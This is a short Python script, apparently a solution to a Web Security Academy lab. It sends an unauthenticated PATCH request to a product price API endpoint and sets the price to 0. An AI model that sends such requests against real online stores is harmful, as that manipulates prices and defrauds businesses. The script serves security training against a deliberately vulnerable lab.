import httpx

url = 'https://0a9b006804e026b281a8390b00d500df.web-security-academy.net/api/products/1/price'
headers = {'Content-Type': 'application/json'}
data = {'price':0}
req = httpx.patch(url=url, headers=headers, json=data)
req_text = req.text
print(req_text)
